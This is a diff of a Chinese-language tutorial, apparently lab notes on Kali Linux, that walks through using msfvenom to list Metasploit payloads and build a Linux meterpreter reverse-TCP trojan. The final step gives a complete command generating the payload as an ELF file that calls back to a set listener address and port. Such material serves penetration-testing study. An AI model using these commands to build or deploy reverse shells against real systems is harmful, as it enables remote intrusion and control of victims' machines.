@@ -43,16 +43,16 @@ Kali 中默认安装了 **Metasploit** 框架。
 1. 先使用 `msfvenom -l payloads` 命令，查看**可用的木马**。
 因为可用的木马有**很多**，所以可以根据所需木马的特性、结合 **grep** 限定木马的种类 ![image-20230426010221520](https://res.cloudinary.com/sycamore/image/upload/v1792085357/Typora/2023/04/ebeb726eacc7fad3302b80554fb13af1.png)
 以木马 `linux/x86/meterpreter/reverse_tcp`（反向连接)作为样例，
-<br>
+
 2. 查看该木马**需要设置的选项**：
 `msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options`![image-20230426010409894](https://res.cloudinary.com/sycamore/image/upload/v1792085350/Typora/2023/04/874f3751e4961c5140e9e30ca40f22e7.png)
 
 
-<br>
+
 
 3. 查看可指定的**输出格式**：
 `msfvenom --list formats`![image-20230426010426398](https://res.cloudinary.com/sycamore/image/upload/v1792085347/Typora/2023/04/38ea1bb4d485262080541e030e6fc0a3.png)
-<br>
+
 
 4. 参考上面得到的信息，构造**生成木马**的命令：
 `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -o /root/payload.elf`![image-20230426010433724](https://res.cloudinary.com/sycamore/image/upload/v1792085352/Typora/2023/04/09553b61c2c9d88fe78ede3ea742468a.png)
